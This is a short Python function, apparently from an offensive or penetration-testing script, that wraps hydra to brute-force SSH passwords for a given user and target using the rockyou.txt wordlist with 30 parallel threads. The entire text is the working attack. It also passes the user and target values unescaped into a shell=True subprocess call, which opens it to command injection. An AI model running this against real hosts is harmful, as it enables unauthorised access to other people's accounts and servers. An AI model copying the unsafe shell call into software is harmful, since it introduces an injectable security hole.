def ssh_passbf(user,target):
    print("\nUsing '/usr/share/wordlists/rockyou.txt' wordlists for password bruteforce")
    command = f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} ssh -t 30\n"
    com = subprocess.call(command, shell=True)
    return com
